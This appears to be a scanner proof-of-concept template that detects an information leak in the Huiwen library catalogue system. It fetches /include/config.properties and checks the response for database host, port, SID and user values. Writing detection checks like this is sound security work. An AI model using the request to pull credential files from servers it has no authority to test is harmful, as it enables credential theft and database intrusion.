expression: r0()
id: huiwen-book-config-properties-info-leak
info:
  author: zan8in
  description: "\u6C47\u6587 \u56FE\u4E66\u9986\u4E66\u76EE\u68C0\u7D22\u7CFB\u7EDF\
    \ /include/config.properties \u6587\u4EF6\u4E2D\u5305\u542B\u654F\u611F\u4FE1\u606F\
    \uFF0C\u653B\u51FB\u8005\u53EF\u4EE5\u76F4\u63A5\u8BBF\u95EE\u83B7\u53D6\u4FE1\
    \u606F\napp=\"\u6C47\u6587\u8F6F\u4EF6-\u4E66\u76EE\u68C0\u7D22\u7CFB\u7EDF\"\n"
  name: "\u6C47\u6587 \u56FE\u4E66\u9986\u4E66\u76EE\u68C0\u7D22\u7CFB\u7EDF config.properties\
    \ \u4FE1\u606F\u6CC4\u6F0F\u6F0F\u6D1E"
  reference:
  - http://wiki.peiqi.tech/wiki/webapp/%E6%B1%87%E6%96%87/%E6%B1%87%E6%96%87%20%E5%9B%BE%E4%B9%A6%E9%A6%86%E4%B9%A6%E7%9B%AE%E6%A3%80%E7%B4%A2%E7%B3%BB%E7%BB%9F%20config.properties%20%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
  severity: high
rules:
  r0:
    expression: response.status == 200 && response.body.bcontains(b'host') && response.body.bcontains(b'port=')
      && response.body.bcontains(b'sid=') && response.body.bcontains(b'user=')
    request:
      method: GET
      path: /include/config.properties
